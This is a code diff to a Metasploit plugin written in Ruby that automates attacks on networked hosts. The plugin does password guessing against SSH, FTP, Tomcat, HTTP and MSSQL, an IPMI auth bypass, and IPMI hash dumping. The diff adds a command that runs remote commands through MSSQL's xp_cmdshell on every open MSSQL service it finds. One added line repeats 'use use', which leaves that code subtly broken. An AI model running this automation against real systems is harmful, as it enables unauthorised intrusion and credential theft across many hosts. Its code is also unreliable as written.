@@ -91,18 +91,19 @@ module Msf
 
     def commands
         {
-	  'ssh_attack' => "Try password guessing on SSH services",
-	  'snmp_attack' => "Try password guessing on SNMP services",
-	  'ftp_attack' => "Try password guessing on FTP services",
+	        'ssh_attack' => "Try password guessing on SSH services",
+	        'snmp_attack' => "Try password guessing on SNMP services",
+	        'ftp_attack' => "Try password guessing on FTP services",
           'tomcat_enum' => "Enumerate Apache Tomcat services",
-	  'tomcat_attack' => "Try password guessing on Apache Tomcat Mgr services",
-	  'http_attack' => "Try password guessing on HTTP services",
-	  'jboss_enum' => "Enumerate Jboss services",
+	        'tomcat_attack' => "Try password guessing on Apache Tomcat Mgr services",
+	        'http_attack' => "Try password guessing on HTTP services",
+	        'jboss_enum' => "Enumerate Jboss services",
           'report_hosts' => "Spit out all open ports and info for each host",
           'smb_enum' => "Enumerate SMB services and Windows OS versions",
           'mssql_enum' => "Enumerate MSSQL services",
           'mssql_attack_blank' => "Try a blank password for the sa user on MSSQL services",
           'mssql_attack' => "Try common users and passwords on MSSQL services",
+          'mssql_xpcmd' => "Try running xp_command_shell on MSSQL services",
           'ipmi_enum' => "Enumerate IPMI services",
           'ipmi_czero' => "Try Cipher Zero auth bypass on IPMI services",
           'ipmi_dumphashes' => "Try to dump user hashes on IPMI services",
@@ -233,6 +234,14 @@ module Msf
         self.shell.run_single("set BLANK_PASSWORDS true")
         self.shell.run_single("set USER_AS_PASS true")
          self.shell.run_single("set USERNAME sa")
+        self.shell.run_single("set VERBOSE false")
+        run_aux_module("mssql")
+        run_aux_module("ms-sql-s")
+      end
+
+      def cmd_mssql_xpcmd
+        self.shell.run_single("use use auxiliary/admin/mssql/mssql_exec")
+        self.shell.run_single("set CMD whoami")
         self.shell.run_single("set VERBOSE false")
         run_aux_module("mssql")
         run_aux_module("ms-sql-s")
@@ -480,6 +489,7 @@ module Msf
             end
             if service.name == service_name and service.state == "open"
               self.shell.run_single("set RHOSTS #{host.address}")
+              self.shell.run_single("set RHOST #{host.address}")
               self.shell.run_single("set RPORT #{service.port}")
               self.shell.run_single("run -j")
             end
